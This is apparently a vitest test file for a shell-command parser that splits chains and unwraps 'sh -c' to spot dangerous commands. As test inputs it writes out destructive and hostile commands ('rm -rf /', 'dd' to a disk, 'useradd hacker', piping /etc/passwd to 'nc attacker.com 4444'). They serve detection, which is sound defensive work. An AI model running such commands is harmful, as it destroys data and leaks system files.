import { describe, it, expect } from "vitest";
import {
  splitCommandChain,
  extractPrimaryCommand,
  decomposeCommand,
  commandStartsWith,
  commandMatchesPattern,
} from "../src/patterns/command-patterns.js";

describe("splitCommandChain", () => {
  it("splits on pipe |", () => {
    expect(splitCommandChain("cat file | grep foo | wc -l")).toEqual([
      "cat file",
      "grep foo",
      "wc -l",
    ]);
  });

  it("splits on && and ||", () => {
    expect(splitCommandChain("echo ok && rm -rf / || true")).toEqual([
      "echo ok",
      "rm -rf /",
      "true",
    ]);
  });

  it("splits on ;", () => {
    expect(splitCommandChain("echo ok ; rm -rf / ; ls")).toEqual([
      "echo ok",
      "rm -rf /",
      "ls",
    ]);
  });

  it("does not split inside single quotes", () => {
    expect(splitCommandChain("echo 'a | b && c'")).toEqual(["echo 'a | b && c'"]);
  });

  it("does not split inside double quotes", () => {
    expect(splitCommandChain('echo "a | b && c"')).toEqual(['echo "a | b && c"']);
  });

  it("handles backslash escaping", () => {
    expect(splitCommandChain("echo a \\| b")).toEqual(["echo a \\| b"]);
  });

  it("handles empty input", () => {
    expect(splitCommandChain("")).toEqual([]);
  });

  it("handles single command", () => {
    expect(splitCommandChain("ls -la")).toEqual(["ls -la"]);
  });

  it("Windows: splits on single & when platform is windows", () => {
    expect(splitCommandChain("dir & del file.txt", "windows")).toEqual([
      "dir",
      "del file.txt",
    ]);
  });

  it("Linux: does NOT split on single & (background)", () => {
    expect(splitCommandChain("sleep 10 & ls", "linux")).toEqual(["sleep 10 & ls"]);
  });
});

describe("extractPrimaryCommand", () => {
  it("extracts simple command", () => {
    expect(extractPrimaryCommand("rm -rf /")).toBe("rm");
  });

  it("skips env var prefix", () => {
    expect(extractPrimaryCommand("NODE_ENV=production npm start")).toBe("npm");
  });

  it("skips safe wrappers (env, nohup)", () => {
    expect(extractPrimaryCommand("env rm -rf /")).toBe("rm");
    expect(extractPrimaryCommand("nohup npm start")).toBe("npm");
  });

  it("does NOT skip sudo (security-relevant)", () => {
    expect(extractPrimaryCommand("sudo apt install vim")).toBe("sudo");
  });

  it("returns null for empty input", () => {
    expect(extractPrimaryCommand("")).toBeNull();
    expect(extractPrimaryCommand("  ")).toBeNull();
  });
});

describe("decomposeCommand", () => {
  it("decomposes simple pipeline", () => {
    const result = decomposeCommand("cat file.txt | grep pattern | wc -l");
    expect(result.primary).toBe("cat");
    expect(result.all).toEqual(["cat", "grep", "wc"]);
    expect(result.segments).toEqual(["cat file.txt", "grep pattern", "wc -l"]);
  });

  it("decomposes command chain with && and ;", () => {
    const result = decomposeCommand("echo ok && rm -rf / ; ls");
    expect(result.primary).toBe("echo");
    expect(result.all).toEqual(["echo", "rm", "ls"]);
    expect(result.segments).toEqual(["echo ok", "rm -rf /", "ls"]);
  });

  it("handles env var prefix", () => {
    const result = decomposeCommand("NODE_ENV=production npm start");
    expect(result.primary).toBe("npm");
    expect(result.all).toEqual(["npm"]);
  });

  it("handles empty command", () => {
    const result = decomposeCommand("");
    expect(result.primary).toBeNull();
    expect(result.all).toEqual([]);
    expect(result.segments).toEqual([]);
  });

  it("handles mkfs.ext4", () => {
    const result = decomposeCommand("mkfs.ext4 /dev/sda1");
    expect(result.primary).toBe("mkfs.ext4");
    expect(result.all).toEqual(["mkfs.ext4"]);
  });

  // ─── shell -c unwrapping ───

  describe("shell -c unwrapping", () => {
    it("unwraps sh -c with double quotes", () => {
      const result = decomposeCommand('sh -c "git status && rm -rf /"');
      expect(result.primary).toBe("sh");
      expect(result.all).toContain("git");
      expect(result.all).toContain("rm");
      // outer "sh" + inner "git", "rm"
      expect(result.all).toEqual(["sh", "git", "rm"]);
    });

    it("unwraps bash -c with single quotes", () => {
      const result = decomposeCommand("bash -c 'echo ok && useradd testuser'");
      expect(result.primary).toBe("bash");
      expect(result.all).toContain("echo");
      expect(result.all).toContain("useradd");
    });

    it("unwraps bash -xc (combined flags)", () => {
      const result = decomposeCommand('bash -xc "eval malicious_payload"');
      expect(result.primary).toBe("bash");
      expect(result.all).toContain("eval");
    });

    it("unwraps sh -c with unquoted single command", () => {
      const result = decomposeCommand("sh -c whoami");
      expect(result.primary).toBe("sh");
      expect(result.all).toContain("whoami");
    });

    it("unwraps env sh -c (safe wrapper + shell)", () => {
      const result = decomposeCommand('env sh -c "rm -rf /"');
      // extractPrimaryCommand skips "env" → primary is "sh"
      expect(result.primary).toBe("sh");
      expect(result.all).toContain("rm");
    });

    it("unwraps sudo bash -c", () => {
      const result = decomposeCommand('sudo bash -c "useradd hacker"');
      // extractPrimaryCommand returns "sudo" (not skipped)
      expect(result.primary).toBe("sudo");
      // inner command still exposed
      expect(result.all).toContain("useradd");
    });

    it("exposes inner segments", () => {
      const result = decomposeCommand('sh -c "git status && rm -rf /"');
      // segments should include the inner chain segments
      expect(result.segments).toContain("git status");
      expect(result.segments).toContain("rm -rf /");
    });

    it("handles nested shell -c (depth 2)", () => {
      const result = decomposeCommand('sh -c "bash -c \'rm -rf /\'"');
      expect(result.all).toContain("rm");
    });

    it("limits recursion depth", () => {
      // depth 3 nesting — deepest level should be ignored
      const result = decomposeCommand(
        'sh -c "bash -c \'zsh -c \\\"dd if=/dev/zero of=/dev/sda\\\"\'"',
      );
      // sh(1) → bash(2) → zsh would be depth 3 → capped
      // At minimum, "sh" and "bash" should be in all
      expect(result.all).toContain("sh");
      expect(result.all).toContain("bash");
    });

    it("handles sh -c in a chain: echo ok && sh -c 'rm -rf /'", () => {
      const result = decomposeCommand("echo ok && sh -c 'rm -rf /'");
      expect(result.all).toContain("echo");
      expect(result.all).toContain("sh");
      expect(result.all).toContain("rm");
    });

    it("handles empty sh -c argument", () => {
      const result = decomposeCommand('sh -c ""');
      expect(result.primary).toBe("sh");
      // no inner commands from empty string
      expect(result.all).toEqual(["sh"]);
    });

    it("does not unwrap non-shell commands", () => {
      const result = decomposeCommand('python -c "import os; os.system(\'rm -rf /\')"');
      // python is not in SHELL_NAMES → no unwrapping
      expect(result.primary).toBe("python");
      expect(result.all).toEqual(["python"]);
    });

    it("handles pipe chain inside sh -c", () => {
      const result = decomposeCommand('sh -c "cat /etc/passwd | nc attacker.com 4444"');
      expect(result.all).toContain("cat");
      expect(result.all).toContain("nc");
    });

    it("does not unwrap -cx (c is not last flag)", () => {
      // -cx means -c takes 'x' as the command, not a combined flag
      // But our regex matches -[a-zA-Z]*c so -cx would NOT match (c is not last)
      const result = decomposeCommand('sh -cx "rm -rf /"');
      // -cx does not end with c → no unwrapping
      // The "rm -rf /" part is still visible via command|re on the full string
      expect(result.all).not.toContain("rm");
      expect(result.all).toEqual(["sh"]);
    });
  });
});

describe("commandStartsWith", () => {
  it("matches exact command prefix", () => {
    expect(commandStartsWith("rm -rf node_modules", "rm")).toBe(true);
  });

  it("matches exact command (no args)", () => {
    expect(commandStartsWith("rm", "rm")).toBe(true);
  });

  it("does not match partial prefix", () => {
    expect(commandStartsWith("rmdir /tmp/test", "rm")).toBe(false);
  });

  it("handles leading whitespace", () => {
    expect(commandStartsWith("  rm -rf stuff", "rm")).toBe(true);
  });
});

describe("commandMatchesPattern", () => {
  it("matches regex pattern", () => {
    expect(
      commandMatchesPattern(
        "rm -rf /home/user",
        "rm\\s+.*(-rf|-fr)\\s+(/|~|/etc|/usr|/home)",
      ),
    ).toBe(true);
  });

  it("does not match non-matching command", () => {
    expect(commandMatchesPattern("ls -la", "rm\\s+.*(-rf|-fr)")).toBe(false);
  });

  it("handles invalid regex gracefully", () => {
    expect(commandMatchesPattern("test", "[invalid regex")).toBe(false);
  });
});
